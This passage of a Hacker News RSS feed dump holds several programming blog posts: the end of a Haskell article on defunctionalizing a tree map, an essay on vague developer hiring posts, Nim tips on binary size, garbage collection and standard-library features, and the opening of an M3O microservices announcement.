<p>Now I replace <code>I</code> with <code>[]</code>, <code>K1 t2 k</code> with <code>Left t2 : k</code> and <code>K2 r1 k</code> with <code>Right r1 : k</code>. I also, very suggestively, rename <code>go</code> to <code>down</code> and <code>eval</code> to <code>up</code>:</p>
<div><pre><code><span>map5 ::</span> forall a b<span>.</span> (a <span>-&gt;</span> b) <span>-&gt;</span> <span>T</span> a <span>-&gt;</span> <span>T</span> b
map5 f t <span>=</span> down t []
  <span>where</span>
<span>    down ::</span> <span>T</span> a <span>-&gt;</span> <span>K'</span> a b <span>-&gt;</span> <span>T</span> b
    down (<span>L</span> x) k  <span>=</span> up k (<span>L</span> (f x))
    down (<span>B</span> t1 t2) k  <span>=</span> down t1 (<span>Left</span> t2 <span>:</span> k)

<span>    up ::</span> <span>K'</span> a b <span>-&gt;</span> <span>T</span> b <span>-&gt;</span> <span>T</span> b
    up [] r <span>=</span> r
    up (<span>Left</span>  t2 <span>:</span> k) r1 <span>=</span> down t2 (<span>Right</span> r1 <span>:</span> k)
    up (<span>Right</span> r1 <span>:</span> k) r2 <span>=</span> up k (<span>B</span> r1 r2)</code></pre></div>
<p>At this point, the code suddenly makes more sense again. In fact, I can try to verbalize it:</p>
<blockquote>
<p>As we traverse the tree, we have to remember for all parent nodes, whether there is still something <code>Left</code> to do when we come back to it (so we remember a <code>T a</code>), or if we are done with that (so we have a <code>T b</code>). This is the list <code>K' a b</code>.</p>
<p>We begin to go <code>down</code> the left of the tree (noting that the right siblings are still left to do), until we hit a leaf. We transform the leaf, and then go <code>up</code>.</p>
<p>If we go <code>up</code> and hit the root, we are done. Else, if we go <code>up</code> and there is something <code>Left</code> to do, we remember the subtree that we just processed (as that is already in the <code>Right</code> form), and go <code>down</code> the other subtree. But if we go <code>up</code> and there is nothing <code>Left</code> to do, we put the two subtrees together and continue going up.</p>
</blockquote>
<p>Quite neat!</p>
<h3 id="the-imperative-loop">The imperative loop</h3>
<p>At this point we could stop: the code is pretty, makes sense, and has the properties we want. But let’s turn the dial a bit further and try to make it an imperative loop.</p>
<p>We know that if we have a single tail-recursive function, then that’s equivalent to a loop, with the function’s parameter turning into mutable variables. But we have two functions!</p>
<p>It turns out that if you have two functions <code>a -&gt; r</code> and <code>b -&gt; r</code> that have the same return type (which they necessarily have here, since we CPS-converted them further up), then those two functions are equivalent to a <em>single</em> function taking “<code>a</code> or <code>b</code>”, i.e. <code>Either a b -&gt; r</code>. This really nothing else than the high-school level algebra rule of <span><em>r</em><sup><em>a</em></sup> ⋅ <em>r</em><sup><em>b</em></sup> = <em>r</em><sup><em>a</em> + <em>b</em></sup></span>.</p>
<p>So (after reordering the arguments of <code>down</code> to put <code>T b</code> first) we can rewrite the code as</p>
<div><pre><code><span>map6 ::</span> forall a b<span>.</span> (a <span>-&gt;</span> b) <span>-&gt;</span> <span>T</span> a <span>-&gt;</span> <span>T</span> b
map6 f t <span>=</span> go (<span>Left</span> t) []
  <span>where</span>
<span>    go ::</span> <span>Either</span> (<span>T</span> a) (<span>T</span> b) <span>-&gt;</span> <span>K'</span> a b <span>-&gt;</span> <span>T</span> b
    go (<span>Left</span> (<span>L</span> x))     k        <span>=</span> go (<span>Right</span> (<span>L</span> (f x))) k
    go (<span>Left</span> (<span>B</span> t1 t2)) k        <span>=</span> go (<span>Left</span> t1) (<span>Left</span> t2 <span>:</span> k)
    go (<span>Right</span> r)  []             <span>=</span> r
    go (<span>Right</span> r1) (<span>Left</span>  t2 <span>:</span> k) <span>=</span> go (<span>Left</span> t2) (<span>Right</span> r1 <span>:</span> k)
    go (<span>Right</span> r2) (<span>Right</span> r1 <span>:</span> k) <span>=</span> go (<span>Right</span> (<span>B</span> r1 r2)) k</code></pre></div>
<p>Do you see the loop yet? If not, maybe it helps to compare it with the following equivalent imperative looking pseudo-code:</p>
<pre><code>mapLoop :: forall a b. (a -&gt; b) -&gt; T a -&gt; T b
mapLoop f t {
  var node = Left t;
  var parents = [];
  while (true) {
    switch (node) {
      Left (L x) -&gt; node := Right (L (f x))
      Left (B t1 t2) -&gt; node := Left t1; parents.push(Left t2)
      Right r1 -&gt; {
        if (parents.len() == 0) {
          return r1;
        } else {
          switch (parents.pop()) {
            Left t2  -&gt; node := Left t2; parents.push(Right r1);
            Right r2 -&gt; node := Right (B r1 r2)
          }
        }
      }
    }
  }
}</code></pre>
<h3 id="conclusion">Conclusion</h3>
<p>I find it enlightening to see how apparently very different approaches to a problem (recursive, lazy …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.joachim-breitner.de/blog/778-Don%E2%80%99t_think%2C_just_defunctionalize">https://www.joachim-breitner.de/blog/778-Don%E2%80%99t_think%2C_just_defunctionalize</a></em></p>]]>
            </description>
            <link>https://www.joachim-breitner.de/blog/778-Don%E2%80%99t_think%2C_just_defunctionalize</link>
            <guid isPermaLink="false">hacker-news-small-sites-25505701</guid>
            <pubDate>Tue, 22 Dec 2020 12:44:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Quickly Looking for Developers?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25505587">thread link</a>) | @pyb
<br/>
December 22, 2020 | https://vsevolod.net/quickly-looking-for-developers/ | <a href="https://web.archive.org/web/*/https://vsevolod.net/quickly-looking-for-developers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
            <article>

    <header>
        
        <p>
          4 min read
          
        </p>
    </header>

    <section>
        <p>Because there is a significant shortage of experienced developers on the market
and has been for quite some time, you rarely have a queue of great candidates
for a newly opened position.</p>
<p>It’s common for engineers to groan about irrelevant spammy requests from
clueless recruiters on LinkedIn with “We think you can be a great fit for our
job opening. You’ll develop our front-end in KubeScript and you need 15 years of
experience in Kafka”.</p>
<p>This isn’t surprising, given the current market — how much time would an
experienced developer need to find a job? Not the best and most fulfilling job
of their life, but just some job with enough compensation to support their
family.</p>
<p>For a lot of folks all it would take are a change in their LinkedIn profile and
a tweet like “X years of experience in this and that, looking for work,
area/remote!”</p>
<p>Hence lots of developers adopt a somewhat sarcastic stance regarding unsolicited
job propositions like “suuure, tell me more”. It’s probably not the most
constructive way to go, but I’m not judging it and I was behaving like that for
years<a href="https://vsevolod.net/quickly-looking-for-developers/#note1"><sup id="back1">[1]</sup></a>.</p>
<p>What is much more surprising to me is when people transition to the hiring side
of the market and keep the same attitude. They keep thinking of themselves as
"highly wanted" and when they want to hire someone quickly, they post to social
media something along the lines of “Looking for a super-duper developer for my
project, please retweet!”</p>
<p>Yeah, suuure.</p>
<p>I had roughly the same dialogue with my friends many times over:</p>
<blockquote>
<p>“Can you recommend someone? I’m looking for a Python developer.”<br>
“Nope, everyone’s busy.”<br>
“OK.”</p>
</blockquote>
<p>Why did they need a human to hire? Do they need anybody so quickly that they do
not have time to write a description? How should I refer to someone?</p>
<blockquote>
<p>“Friends are looking for a developer, want to talk to them?”<br>
“Ehh, my current project isn’t too shabby. What do they do?”<br>
“Not really sure, I can introduce you and they’ll explain.”<br>
“Thanks, I’ll pass.”</p>
</blockquote>
<p>I’ve had this conversation a couple of times and do not bother anymore.</p>
<p>Once I’ve asked my friend a dozen or so questions about their project, pried
some information out of him and got a description that was pretty interesting to
a couple of people that I contacted.</p>
<p>Even if they weren’t hired immediately after that, they remembered it. Maybe
their friend is looking for work, maybe they’ll be open for opportunities in
half a year and you’ll still be looking for people to hire.</p>
<p>But that’s not my job to pull information about your project out of you with a
pair of pliers, it’s not a job for your friends, general public or
candidates. It’s your own job.</p>
<p>Even Elon Musk doesn’t just write “I'm hiring developers for a cool project”. He
describes and markets them, for example
<a href="https://twitter.com/elonmusk/status/667516705116065792">Tesla autopilot team</a> in
<a href="https://twitter.com/elonmusk/status/667519445414252544">2015</a>, and
<a href="https://twitter.com/elonmusk/status/1284306733720940544">Neuralink</a> in
<a href="https://twitter.com/elonmusk/status/1284642001888047104">2020</a>.</p>
<p>And everyone knows who Elon Musk is and what he does. I’m baffled whenever I see
retweets “Looking for a great frontend developer for my project!”  written by
effectively anonymous people to me. I’m seeing the same tweets with minor
variations pretty regularly for more than a decade.</p>
<p>The best thing you can do to have good candidates is to write a good honest
description of a project together with the tasks that a person will accomplish
if hired. And it must be you who writes it — a hiring manager, not a poor
recruiter whom you've given a list of five-to-ten buzzwords.</p>
<h4 id="notes">Notes<a href="#notes" aria-label="Anchor link for: notes">🔗</a></h4>
<p><a href="https://vsevolod.net/quickly-looking-for-developers/#back1"><sup id="note1">[1]</sup></a> For context: I was a professional
developer since 2006 and for half of that time I’m much more often on the hiring
side.</p>

    </section>

    

</article>


        </div></div>]]>
            </description>
            <link>https://vsevolod.net/quickly-looking-for-developers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25505587</guid>
            <pubDate>Tue, 22 Dec 2020 12:27:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nim Apocrypha, Vol. I]]>
            </title>
            <description>
<![CDATA[
Score 114 | Comments 50 (<a href="https://news.ycombinator.com/item?id=25505492">thread link</a>) | @ibobev
<br/>
December 22, 2020 | https://blog.johnnovak.net/2020/12/21/nim-apocrypha-vol1/ | <a href="https://web.archive.org/web/*/https://blog.johnnovak.net/2020/12/21/nim-apocrypha-vol1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">

    

    <div role="main">



<article>
  <header>
    
    <p><time datetime="2020-12-21">2020 Dec 21</time></p>
  </header>

  
    <nav>
      <ul>
      
        <li><a href="https://blog.johnnovak.net/tag/coding/">coding</a></li>
      
        <li><a href="https://blog.johnnovak.net/tag/nim/">nim</a></li>
      
      </ul>
    </nav>
  

  


<ul id="markdown-toc">
  <li><a href="#intro" id="markdown-toc-intro">Intro</a></li>
  <li><a href="#i--the-not-so-obvious" id="markdown-toc-i--the-not-so-obvious">I — The Not-So-Obvious</a>    <ul>
      <li><a href="#1--reducing-executable-size-by-stripping-debug-symbols" id="markdown-toc-1--reducing-executable-size-by-stripping-debug-symbols">1 &nbsp; Reducing executable size by stripping debug symbols</a></li>
      <li><a href="#2--release-builds-with-exception-logging" id="markdown-toc-2--release-builds-with-exception-logging">2 &nbsp; Release builds with exception logging</a></li>
      <li><a href="#3--switching-to-arcorc" id="markdown-toc-3--switching-to-arcorc">3 &nbsp; Switching to ARC/ORC</a></li>
      <li><a href="#4--executable-icons-on-windows-mingw" id="markdown-toc-4--executable-icons-on-windows-mingw">4 &nbsp; Executable icons on Windows (MinGW)</a></li>
      <li><a href="#5--debug-echo-in-windows-gui-programs-mingw" id="markdown-toc-5--debug-echo-in-windows-gui-programs-mingw">5 &nbsp; Debug echo in Windows GUI programs (MinGW)</a></li>
    </ul>
  </li>
  <li><a href="#ii--the-hidden" id="markdown-toc-ii--the-hidden">II — The Hidden</a>    <ul>
      <li><a href="#6--using-keyword" id="markdown-toc-6--using-keyword">6 &nbsp; ‘using’ keyword</a></li>
      <li><a href="#7--opening-urls-in-the-default-browser" id="markdown-toc-7--opening-urls-in-the-default-browser">7 &nbsp; Opening URLs in the default browser</a></li>
      <li><a href="#8--cross-platform-home-and-config-directories" id="markdown-toc-8--cross-platform-home-and-config-directories">8 &nbsp; Cross-platform home and config directories</a></li>
      <li><a href="#9--debug-dumping-expressions" id="markdown-toc-9--debug-dumping-expressions">9 &nbsp; Debug dumping expressions</a></li>
      <li><a href="#10--measuring-elapsed-time" id="markdown-toc-10--measuring-elapsed-time">10 &nbsp; Measuring elapsed time</a></li>
      <li><a href="#11--dealing-with-openarrays" id="markdown-toc-11--dealing-with-openarrays">11 &nbsp; Dealing with openarrays</a></li>
    </ul>
  </li>
  <li><a href="#iii--the-crafty" id="markdown-toc-iii--the-crafty">III — The Crafty</a>    <ul>
      <li><a href="#12--easy-pointer-manipulations" id="markdown-toc-12--easy-pointer-manipulations">12 &nbsp; Easy pointer manipulations</a></li>
      <li><a href="#13--taming-circular-type-dependencies" id="markdown-toc-13--taming-circular-type-dependencies">13 &nbsp; Taming circular type dependencies</a></li>
      <li><a href="#14--with-macro" id="markdown-toc-14--with-macro">14 &nbsp; ‘with’ macro</a></li>
      <li><a href="#15--aliases" id="markdown-toc-15--aliases">15 &nbsp; Aliases</a></li>
    </ul>
  </li>
  <li><a href="#iv--the-grand-finale" id="markdown-toc-iv--the-grand-finale">IV — The Grand Finale</a>    <ul>
      <li><a href="#16--saving-memory-by-object-field-reordering" id="markdown-toc-16--saving-memory-by-object-field-reordering">16 &nbsp; Saving memory by object field reordering</a>        <ul>
          <li><a href="#the-enigma" id="markdown-toc-the-enigma">The Enigma</a></li>
          <li><a href="#the-explanation" id="markdown-toc-the-explanation">The Explanation</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#outro" id="markdown-toc-outro">Outro</a></li>
</ul>

<h2 id="intro">Intro</h2>

<p>Greetings fellow Nim adventurers! Below you will find 16 handy Nim tips
&amp; tricks I came across while developing a medium-sized GUI program this year,
<a href="https://github.com/johnnovak/gridmonger">Gridmonger</a>
(<a href="https://github.com/johnnovak/koi">and</a>
<a href="https://github.com/johnnovak/nim-riff">related</a>
<a href="https://github.com/johnnovak/nim-binstreams">libraries</a>).  Some of them are
about less known or undocumented Nim features or standard library functions,
a few are workarounds for some rough edges of the language, and there’s also
a handful of useful techniques I read about in forums or have invented on my
own.</p>

<p>All tips are for Nim 1.4.2 and beyond, and most are applicable to the
C backend. I hope you’ll find something useful here that will make your time
with Nim more enjoyable and productive!</p>

<h2 id="i--the-not-so-obvious">I — The Not-So-Obvious</h2>

<h3 id="1--reducing-executable-size-by-stripping-debug-symbols">1 &nbsp; Reducing executable size by stripping debug symbols</h3>

<p>Nim touts itself as a language capable of generating small native binaries.
But just naively compiling some program with <code>nim c -d:release</code> and looking at
the file sizes will make you wonder about the validity of that claim!</p>

<p>A release build of <a href="https://github.com/johnnovak/gridmonger">Gridmonger</a>
weighs around 12 megs. Anything but small, if you ask me!<sup id="fnref:small" role="doc-noteref"><a href="#fn:small">1</a></sup> Sure, it
statically links <a href="https://github.com/johnnovak/nim-glfw">GLFW</a> and
<a href="https://github.com/johnnovak/nim-nanovg">NanoVG</a> and a bunch of other Nim
libraries, but to put things into perspective, <a href="https://reaper.fm/">REAPER</a> (a
highly-advanced and complex DAW written in C/C++) is about the same size at
~13 megs! Surely, my program is much simpler than REAPER, so what’s going on
here?</p>

<p>It turns out that gcc debug symbols are included in Nim binaries by default,
which can account for a quite substantial 2-to 5-fold size increase! Luckily,
we can remove them easily with the <code>strip</code> command which comes with gcc.</p>

<p>How about trying to optimise for a small executable with <code>--opt:size</code>?  Sure,
that would yield about 30% smaller binaries, but at the expense of some
potential runtime performance loss. So while it might not always be the best
option, but you can always it <em>and</em> strip the debug symbols for even bigger
savings.</p>

<p>Finally, if you’re hell-bent on producing smallest possible binary,
compressing it with an executable packer like <a href="https://upx.github.io/">UPX</a>
could be just the ticket.</p>

<p>The below table summarises my findings with some concrete data:</p>

<figure>
  <table>
    <tbody><tr>
      <th rowspan="2">Compiler flags</th>
      <th rowspan="2">File</th>
      <th colspan="2">Binary size</th>
    </tr>
    <tr>
      <th>Bytes</th>
      <th>Ratio</th>
    </tr>

    <tr>
      <td rowspan="3"><code>-d:release<br>--gc:arc --deepCopy:on</code></td>
      <td>original</td>
      <td>12,177,797</td>
      <td>1.00</td>
    </tr>
    <tr>
      <td>stripped</td>
      <td>2,269,696</td>
      <td>0.18</td>
    </tr>
    <tr>
      <td>compressed</td>
      <td>806,912</td>
      <td>0.07</td>
    </tr>

    <tr>
      <td rowspan="3"><code>-d:release --opt:size<br>--gc:arc --deepCopy:on</code></td>
      <td>original</td>
      <td>7,959,126</td>
      <td>1.00</td>
    </tr>
    <tr>
      <td>stripped</td>
      <td>1,655,296</td>
      <td>0.21</td>
    </tr>
    <tr>
      <td>compresed</td>
      <td>623,104</td>
      <td>0.08</td>
    </tr>
  </tbody></table>

  <figcaption>Table 1 — Comparison of compiled executable sizes for Gridmonger
  (with and without debug symbols, and without debug symbols and compressed
  with UPX) </figcaption>
</figure>

<p>I had repeated the experiment with the following minimal Nim program:</p>



<figure>
  <table>
    <tbody><tr>
      <th rowspan="2">Compiler flags</th>
      <th rowspan="2">File</th>
      <th colspan="2">Binary size</th>
    </tr>
    <tr>
      <th>Bytes</th>
      <th>Ratio</th>
    </tr>

    <tr>
      <td rowspan="3"><code>-d:release</code></td>
      <td>original</td>
      <td>125,068</td>
      <td>1.00</td>
    </tr>
    <tr>
      <td>stripped</td>
      <td>73,728</td>
      <td>0.59</td>
    </tr>
    <tr>
      <td>compresed</td>
      <td>31,232</td>
      <td>0.25</td>
    </tr>

    <tr>
      <td rowspan="3"><code>-d:release --opt:size</code></td>
      <td>original</td>
      <td>87,812</td>
      <td>1.00</td>
    </tr>
    <tr>
      <td>stripped</td>
      <td>36,352</td>
      <td>0.41</td>
    </tr>
    <tr>
      <td>compresed</td>
      <td>18,944</td>
      <td>0.22</td>
    </tr>
  </tbody></table>

  <figcaption>Table 2 — Comparison of compiled executable sizes for a minimal
  Nim program (with and without debug symbols, and without debug symbols and
  compressed with UPX)</figcaption>
</figure>

<p>It is important to note that the presence of debug symbols in a binary <em>does
not</em> affect its runtime performance whatsoever. This is because debug symbols
are not even loaded into memory during normal use, only when debugging. So
really it only affects the space the executable takes up on disk.</p>

<p>In case you’re wondering, you’ll still get nice Nim stack traces with
a stripped binary if you compiled it with <code>-d:debug</code> or <code>--stacktrace=on
--linetrace=on</code> (more on that in the next tip).</p>

<h3 id="2--release-builds-with-exception-logging">2 &nbsp; Release builds with exception logging</h3>

<p>Creating a release build with <code>-d:release</code> gives you a speed boost, but at
the price of turning off stack traces (among other things). This can be a problem
if you’re trying to implement a crash-reporting mechanism for end-users,
which involves surrounding your main method with a <code>try/except</code> block and
writing exceptions with stack traces to a log file.</p>

<p>Luckily, you don’t need to ship debug builds to your users just to be able to
do that; you can still use <code>-d:release</code> to get most optimisation benefits
while turning stack traces back on with <code>--stacktrace=on --linetrace=on</code>. The
performance of the resulting binary might be a bit slower, but you know, life
is all about the right trade-offs.</p>

<h3 id="3--switching-to-arcorc">3 &nbsp; Switching to ARC/ORC</h3>

<p>Nim defaults to the <code>refc</code> garbage collector (deferred reference counting with
a mark &amp; sweep phase for cycle collection), which works very well, even for
soft-realtime requirements. But did you know that there has been a brand new
GC introduced in 1.2.x that offers reduced memory footprint and even better
performance in most cases?</p>

<p>This is ARC, the fully deterministic Automatic Reference Counting garbage
collector. Switching to ARC is as easy as supplying the <code>--gc:arc</code> option to
the compiler. It’s a drop-in replacement for most programs. Depending on your
program, you might want to use it with the <code>--deepcopy:on
--hint[Performance]:off</code> options.</p>

<p>ARC has many other benefits, including hard realtime support, shared heaps
between threads, and simplifying the C FFI.  Mind you, ARC cannot handle
cyclic data structures. But it has a big brother called ORC, which adds support
for that.</p>

<p>You can learn more about ARC and ORC in this <a href="https://nim-lang.org/blog/2020/10/15/introduction-to-arc-orc-in-nim.html">excellent blog
post</a>
on the Nim website.</p>

<h3 id="4--executable-icons-on-windows-mingw">4 &nbsp; Executable icons on Windows (MinGW)</h3>

<p>Setting the icon for Windows executables is probably easier with Visual
Studio, but anyhow, here are the instructions for gcc/MinGW that I’m using.</p>

<ol>
  <li>
    <p>First, you’ll need to generate an <code>.ico</code> file that contains your icon image
in multiple resolutions. There’s lots of online tools for that, and there’s
also ImageMagick—this is outside the scope of this article.</p>
  </li>
  <li>
    <p>Once you have your image, you’ll need to create a resource definition <code>.rc</code>
file that references your icon file. I used <code>appicon</code> here for the ID, but
you can use any other string, it doesn’t matter:</p>

    <div><div><pre><code> appicon ICON "gridmonger.ico"
</code></pre></div>    </div>
  </li>
  <li>
    <p>The next step is to create the resource object file from the <code>.rc</code> file
(<code>windres</code> is included in MinGW):</p>

    <div><div><pre><code> windres gridmonger.rc -O coff -o gridmonger.res
</code></pre></div>    </div>
  </li>
  <li>
    <p>Finally, we need to instruct the compiler to link the resource file
into our program:</p>

    <div><div><pre><code> <span>when</span> <span>defined</span><span>(</span><span>windows</span><span>):</span>
   <span>{.</span><span>link</span><span>:</span> <span>"icons/gridmonger.res"</span><span>.}</span>
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="5--debug-echo-in-windows-gui-programs-mingw">5 &nbsp; Debug echo in Windows GUI programs (MinGW)</h3>

<p>This will be a rather short one but it took me a while to figure it out. It
turns out that when you link against the Windows libraries by passing
<code>-mwindows</code> to the linker (<code>-L:-mwindows</code>), you won’t be able to print stuff
the console with <code>echo</code> anymore.</p>

<p>“But this is a useless tip, of course you need to link against the Windows
libs in a GUI program!”, I hear you say. Well, not necessarily. In GLFW apps,
for example, you can get away with not linking against the Windows libs in
many cases. For instance, in Gridmonger I only need <code>-mwindows</code> so I can open
the standard open and save system dialogs. In my debug builds, I don’t link
against the Windows libs and I conditionally turn the calls to the dialog
functions to no-ops, and then I can do my debug printing to the console.</p>



<h3 id="6--using-keyword">6 &nbsp; ‘using’ keyword</h3>

<p>The
<a href="https://nim-lang.org/docs/manual.html#statements-and-expressions-using-statement">using</a>
keyword is a very useful, but often forgotten language feature. It helps to
cut down on redundancy when creating method call style APIs, or when passing
context objects around.</p>

<div><div><pre><code><span># Without `using`</span>
<span>proc </span><span>getFloor</span><span>*</span><span>(</span><span>l</span><span>:</span> <span>Level</span><span>,</span> <span>row</span><span>,</span> <span>col</span><span>:</span> <span>Natural</span><span>,</span> <span>a</span><span>:</span> <span>var</span> <span>AppContext</span><span>):</span> <span>Floor</span> <span>=</span> <span>...</span>
<span>proc </span><span>setFloor</span><span>*</span><span>(</span><span>l</span><span>:</span> <span>Level</span><span>,</span> <span>row</span><span>,</span> <span>col</span><span>:</span> <span>Natural</span><span>,</span> <span>f</span><span>:</span> <span>Floor</span><span>,</span> <span>a</span><span>:</span> <span>var</span> <span>AppContext</span><span>)</span> <span>=</span> <span>...</span>

<span># With `using`</span>
<span>using</span> <span>l</span><span>:</span> <span>Level</span>
<span>using</span> <span>a</span><span>:</span> <span>var</span> <span>AppContext</span>

<span>proc </span><span>getFloor</span><span>*</span><span>(</span><span>l</span><span>;</span> <span>row</span><span>,</span> <span>col</span><span>:</span> <span>Natural</span><span>;</span> <span>a</span><span>):</span> <span>Floor</span> <span>=</span> <span>...</span>
<span>proc </span><span>setFloor</span><span>*</span><span>(</span><span>l</span><span>;</span> <span>row</span><span>,</span> <span>col</span><span>:</span> <span>Natural</span><span>,</span> <span>f</span><span>:</span> <span>Floor</span><span>;</span> <span>a</span><span>)</span> <span>=</span> <span>...</span>
</code></pre></div></div>

<h3 id="7--opening-urls-in-the-default-browser">7 &nbsp; Opening URLs in the default browser</h3>

<p>Did you know that the standard library has
a <a href="https://nim-lang.org/docs/browsers.html">browsers</a> module for the sole
purpose of opening URLs in the OS default browser in a cross-platform way?
In fact, I’ve been using Nim for 4 years and I’ve learned about this just
recently!</p>

<p>This is very handy if you want to navigate the user to a program’s website
from a desktop app, or to open local HTML documentation.</p>

<h3 id="8--cross-platform-home-and-config-directories">8 &nbsp; Cross-platform home and config directories</h3>

<p>Similarly, <a href="https://nim-lang.org/docs/os.html#getHomeDir">getHomeDir()</a> and
<a href="https://nim-lang.org/docs/os.html#getConfigDir">getConfigDir()</a> from the
<a href="https://nim-lang.org/docs/os.html">os</a> module are super handy if you need to
handle configuration files or program data in a cross-platform way.</p>

<h3 id="9--debug-dumping-expressions">9 &nbsp; Debug dumping expressions</h3>

<p>However sophisticated modern development tools might be, just echoing stuff to
the console is still one of the easiest and quickest ways to debug a program.
But writing things like <code>echo "foo: ", foo</code> for the hundredth time gets old
really fast. The <a href="https://nim-lang.org/docs/sugar.html#dump.m%2Cuntyped">dump</a>
macro in the standard <a href="https://nim-lang.org/docs/sugar.html">sugar</a> module
helps with exactly that.</p>

<p>Make sure to check out the other useful additions the module introduces!</p>

<div><div><pre><code><span>import</span> <span>sugar</span>

<span>var</span>
  <span>a</span> <span>=</span> <span>42</span>
  <span>s</span> <span>=</span> <span>"frobnicate"</span>
  <span>x</span> <span>=</span> <span>7</span>

<span>dump</span><span>(</span><span>a</span><span>)</span>
<span>dump</span><span>(</span><span>s</span><span>)</span>
<span>dump</span><span>(</span><span>a</span> <span>+</span> <span>x</span><span>)</span>

<span># prints:</span>
<span># a = 42</span>
<span># s = frobnicate</span>
<span># a + x = 49</span>
</code></pre></div></div>

<h3 id="10--measuring-elapsed-time">10 &nbsp; Measuring elapsed time</h3>

<p>Although you can use the regular <a href="https://nim-lang.org/docs/times.html">times</a>
module to measure elapsed time, to do it properly you really need a monotonic
timer. Such a thing has been added to the standard library recently in the
form of <a href="https://nim-lang.org/docs/monotimes.html">std/monotimes</a>.</p>

<div><div><pre><code><span>import</span> <span>os</span>
<span>import</span> <span>std</span><span>/</span><span>monotimes</span>
<span>import</span> <span>times</span>

<span>proc </span><span>durationToFloatMillis</span><span>*</span><span>(</span><span>d</span><span>:</span> <span>Duration</span><span>):</span> <span>float64</span> <span>=</span>
  <span>inNanoseconds</span><span>(</span><span>d</span><span>).</span><span>float64</span> <span>*</span> <span>1e-6</span>

<span>let</span> <span>t0</span> <span>=</span> <span>getMonoTime</span><span>()</span>
<span>sleep</span><span>(</span><span>10</span><span>)</span> <span># do something for a while</span>
<span>let</span> <span>d</span> <span>=</span> <span>getMonoTime</span><span>()</span> <span>-</span> <span>t0</span>

<span>echo</span> <span>durationToFloatMillis</span><span>(</span><span>d</span><span>)</span>
</code></pre></div></div>

<h3 id="11--dealing-with-openarrays">11 &nbsp; Dealing with openarrays</h3>

<p><a href="https://nim-lang.org/docs/manual.html#types-open-arrays">Openarrays</a>
are a handy Nim feature that allow you to …</p></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.johnnovak.net/2020/12/21/nim-apocrypha-vol1/">https://blog.johnnovak.net/2020/12/21/nim-apocrypha-vol1/</a></em></p>]]>
            </description>
            <link>https://blog.johnnovak.net/2020/12/21/nim-apocrypha-vol1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25505492</guid>
            <pubDate>Tue, 22 Dec 2020 12:09:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A new API backend for the jamstack]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 23 (<a href="https://news.ycombinator.com/item?id=25505353">thread link</a>) | @asim
<br/>
December 22, 2020 | https://blog.m3o.com/2020/12/22/your-new-api-backend-for-the-jamstack.html | <a href="https://web.archive.org/web/*/https://blog.m3o.com/2020/12/22/your-new-api-backend-for-the-jamstack.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    <article>

        

<!--         <header class="post-header">
            <a id="blog-logo" href="">
                
                    <span class="blog-title">Micro</span>
                
            </a>
        </header> -->

        <!-- <span class="post-meta">
            <time datetime="2020-12-22">22 Dec 2020</time>
            
        </span> -->

        <!-- <h1 class="post-title">Your new API backend for the jamstack</h1> -->

        <section>
            <p><br>
Last month we talked about a new architecture pattern, <a href="https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html">Netlify for the frontend, Micro for the backend</a>. As the frontend has evolved towards being dominated by the <a href="https://jamstack.org/">Jamstack</a>, we believe the backend also requires a fundamental shift in it’s design and consumption model.</p>

<p>Netlify, while largely agnostic of framework usage, has promoted decomposition of the traditional stack to something more driven by microservices and APIs. 
<a href="https://m3o.com/">Micro</a> has long been an advocate for that, both as an <a href="https://github.com/micro/micro">open source</a> project and now as a hosted platform called 
<a href="https://blog.m3o.com/2020/11/05/m3o-open-to-the-world.html">M3O</a>.</p>

<h2 id="get-started">Get Started</h2>

<p>If you want to skip right to getting started head to the <a href="https://m3o.com/signup">m3o.com/signup</a>.</p>

<h2 id="evolution-of-the-backend">Evolution of the Backend</h2>

<p>But what’s more, we’re seeing a need from the backend to evolve beyond providing traditional infrastructure services. It’s no longer enough to just focus on
authentication, configuration, storage, hosting, etc. What we really need is higher level APIs that provide business level value.</p>

<p>The most prime examples are Stripe, Twilio, Sengrid and Segment. Who focus on APIs for finance, communications and analytics. AWS, Google and others are providing 
coverage for infra level APIs.</p>

<p>What we really need is the next layer of abstraction. We need the building blocks for new types of APIs and services. Micro acts as a platform for these 
services and now we want to move into offering the next level of value add services.</p>

<h2 id="composition-and-value-add">Composition and Value Add</h2>

<p>What’s clear when working with microservices is that there’s an ability to decompose systems into smaller domain specific reusable services and then aggregate back 
up into many forms as value add services, products and then businesses.</p>

<center>
  <img src="https://blog.m3o.com/assets/images/building-blocks.png">
</center>

<p>As you can see in this image and probably from common experience, most businesses are composed of the same generic building blocks from the infrastructure all the 
way up. It’s only when we get to the business specific requirements that we need our own services to handle that logic.</p>

<p>It’s insane that most of us continue to build the same systems on the backend over and over rather than reusing and building on the foundations of each others 
work. GitHub enabled this for open source at an accelerated pace but we’ve yet to see the same emerge for business logic, services and APIs.</p>

<p>It’s now our goal to facilitate this with a single unified platform and reusable services.</p>

<h2 id="introducing-micro-services">Introducing Micro Services</h2>

<p>Today we’re unveiling <a href="https://github.com/micro/services"><strong>Micro Services</strong></a>, a set of reusable building block services which can be used on the Micro Platform 
whether you’re self hosting the <a href="https://github.com/micro/micro">open source</a> project or using our managed platform <a href="https://m3o.com/">M3O</a>.</p>

<p>Browse directly to <a href="https://github.com/micro/services">github.com/micro/services</a> if you want to read through the code or kick the tyres locally.</p>

<center>
  <img src="https://blog.m3o.com/assets/images/micro-services.png">
</center>



<h3 id="services-included">Services Included</h3>

<p>We’re including 10 services from the get go (available in <a href="https://github.com/micro/services">github.com/micro/services</a>):</p>

<ul>
  <li><strong>Helloworld</strong> - The canonical helloworld to kick the tyres</li>
